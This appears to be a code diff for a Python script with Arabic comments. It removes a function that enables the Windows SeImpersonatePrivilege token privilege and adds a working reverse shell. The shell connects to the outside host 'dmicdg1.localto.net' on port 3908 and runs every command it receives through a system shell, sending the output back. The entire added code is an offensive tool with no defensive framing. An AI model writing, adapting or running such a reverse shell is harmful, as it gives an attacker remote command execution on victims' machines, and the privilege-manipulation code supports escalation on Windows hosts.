@@ -1,26 +1,33 @@
-import ctypes
-import win32security
+import socket
+import subprocess
+import os
 
-def enable_se_impersonate_privilege():
-    try:
-        # الحصول على معلومات المستخدم الحالي
-        user_token = win32security.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
+# إعداد معلومات الاتصال
+HOST = 'dmicdg1.localto.net'
+PORT = 3908
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
 
-        # الحصول على معلومات الامتيازات
-        privileges = win32security.GetTokenInformation(user_token, win32security.TokenPrivileges)
+# إرسال رسالة عند نجاح الاتصال
+s.send(b"[*] Connection Established!\n")
 
-        # البحث عن الامتياز SeImpersonatePrivilege
-        for privilege in privileges:
-            if privilege[0] == win32security.LookupPrivilegeValue(None, "SeImpersonatePrivilege"):
-                # تم العثور على الامتياز، نقوم بتمكينه
-                win32security.AdjustTokenPrivileges(user_token, 0, [(privilege[0], win32security.SE_PRIVILEGE_ENABLED)])
+while True:
+    # إرسال الدليل الحالي
+    s.send(os.getcwd().encode() + b"> ")
+    data = s.recv(1024).decode("utf-8").strip()
 
-                print("SeImpersonatePrivilege enabled")
-                return
+    if data.lower() == "quit":
+        break
+    elif data.startswith("cd"):
+        try:
+            os.chdir(data.split(" ")[1])
+        except FileNotFoundError as e:
+            s.send(str(e).encode())
+    else:
+        # تنفيذ الأمر وإرسال النتائج
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        stdout_value, stderr_value = proc.communicate()
+        output_str = stdout_value + stderr_value
+        s.send(output_str)
 
-        print("SeImpersonatePrivilege not found")
-    except Exception as e:
-        print(f"Error: {e}")
-
-if __name__ == "__main__":
-    enable_se_impersonate_privilege()
+s.close()
